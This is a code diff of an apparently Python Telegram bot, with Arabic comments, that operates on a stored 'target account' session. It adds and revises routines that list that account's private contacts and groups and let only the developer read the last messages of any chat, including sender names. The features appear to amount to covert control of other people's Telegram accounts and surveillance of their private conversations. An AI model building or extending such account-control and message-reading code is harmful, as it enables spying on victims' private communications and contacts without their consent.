@@ -206,6 +206,49 @@ async def get_client_for_user(user_id):
         except:
             return None
 
+# ====== دالة جلب جهات الاتصال (مصححة) ======
+async def get_contacts_from_client(client_obj):
+    contacts = []
+    try:
+        async for dialog in client_obj.get_dialogs():
+            try:
+                chat = dialog.chat
+                # التحقق من أن المحادثة ليست مجموعة أو قناة
+                if hasattr(chat, 'type'):
+                    if chat.type in ['private']:
+                        name = chat.first_name or chat.username or 'مستخدم'
+                        contacts.append(f"👤 {chat.id}: {name}")
+                elif hasattr(chat, 'is_bot'):
+                    if not chat.is_bot:
+                        name = chat.first_name or chat.username or 'مستخدم'
+                        contacts.append(f"👤 {chat.id}: {name}")
+                if len(contacts) >= 20:
+                    break
+            except:
+                continue
+    except:
+        pass
+    return contacts
+
+# ====== دالة جلب المجموعات (مصححة) ======
+async def get_groups_from_client(client_obj):
+    groups = []
+    try:
+        async for dialog in client_obj.get_dialogs():
+            try:
+                chat = dialog.chat
+                if hasattr(chat, 'type'):
+                    if chat.type in ['group', 'supergroup', 'channel']:
+                        title = chat.title or 'مجموعة'
+                        groups.append(f"📢 {chat.id}: {title}")
+                if len(groups) >= 20:
+                    break
+            except:
+                continue
+    except:
+        pass
+    return groups
+
 # ====== معالجة الأزرار ======
 @app.on_callback_query()
 async def handle_callback(client, callback_query: CallbackQuery):
@@ -428,6 +471,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
             return
         
+        # ====== قراءة الرسائل (مصححة) ======
         if data == "read_messages":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -441,7 +485,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.message.edit_text(
                 "📨 قراءة الرسائل\n\n"
                 "أرسل معرف المحادثة لقراءة الرسائل.\n"
-                "مثال: 123456789",
+                "مثال: 123456789\n\n"
+                "لقراءة آخر 10 رسائل من محادثة معينة.",
                 reply_markup=BACK_BUTTON
             )
             user_steps[user_id] = "read_messages"
@@ -468,6 +513,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== جهات الاتصال (مصححة) ======
         if data == "get_contacts":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -483,13 +529,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 if not client_obj:
                     await callback_query.answer("❌ فشل الاتصال!", show_alert=True)
                     return
-                    
-                contacts = []
-                async for dialog in client_obj.get_dialogs():
-                    if hasattr(dialog.chat, 'id') and not dialog.chat.is_bot:
-                        contacts.append(f"👤 {dialog.chat.id}: {dialog.chat.first_name or 'مستخدم'}")
-                        if len(contacts) >= 20:
-                            break
+                
+                contacts = await get_contacts_from_client(client_obj)
                 
                 if not contacts:
                     contacts_text = "❌ لا توجد جهات اتصال."
@@ -505,6 +546,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
             return
         
+        # ====== المجموعات (مصححة) ======
         if data == "get_groups":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -520,14 +562,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 if not client_obj:
                     await callback_query.answer("❌ فشل الاتصال!", show_alert=True)
                     return
-                    
-                groups = []
-                async for dialog in client_obj.get_dialogs():
-                    if hasattr(dialog.chat, 'title') and dialog.chat.title:
-                        if dialog.chat.type in ['group', 'supergroup', 'channel']:
-                            groups.append(f"📢 {dialog.chat.id}: {dialog.chat.title}")
-                            if len(groups) >= 20:
-                                break
+                
+                groups = await get_groups_from_client(client_obj)
                 
                 if not groups:
                     groups_text = "❌ لا توجد مجموعات."
@@ -792,6 +828,7 @@ async def handle_text_commands(client, message):
     text = message.text.strip()
     is_dev = (user_id == YOUR_USER_ID)
     
+    # ====== قراءة الرسائل (مصححة) ======
     if is_dev and user_steps.get(user_id) == "read_messages":
         target_id = user_data.get(user_id, {}).get("target_account")
         if not target_id:
@@ -807,19 +844,33 @@ async def handle_text_commands(client, message):
                 user_steps.pop(user_id, None)
                 return
             
-            messages = []
-            async for msg in client_obj.get_chat_history(chat_id, limit=10):
-                msg_text = msg.text or "[وسائط]"
-                messages.append(f"{msg.date.strftime('%H:%M')}: {msg_text[:50]}...")
+            messages_text = "📨 آخر الرسائل:\n\n"
+            count = 0
+            try:
+                async for msg in client_obj.get_chat_history(chat_id, limit=10):
+                    if msg.text:
+                        sender = msg.from_user.first_name if msg.from_user else 'مجهول'
+                        messages_text += f"👤 {sender}: {msg.text[:100]}\n\n"
+                        count += 1
+                    elif msg.media:
+                        messages_text += f"📎 [وسائط] من {msg.from_user.first_name if msg.from_user else 'مجهول'}\n\n"
+                        count += 1
+            except Exception as e:
+                await message.reply(f"❌ لا يمكن قراءة الرسائل: {str(e)[:100]}")
+                user_steps.pop(user_id, None)
+                return
             
-            if not messages:
+            if count == 0:
                 await message.reply("📨 لا توجد رسائل في هذه المحادثة.")
             else:
                 await message.reply(
-                    "📨 آخر الرسائل:\n\n" + "\n".join(messages),
+                    messages_text,
                     reply_markup=ACCOUNT_CONTROL_BUTTONS
                 )
             
+            user_steps.pop(user_id, None)
+        except ValueError:
+            await message.reply("❌ المعرف يجب أن يكون أرقاماً فقط!")
             user_steps.pop(user_id, None)
         except Exception as e:
             await message.reply(f"❌ خطأ: {str(e)[:100]}")
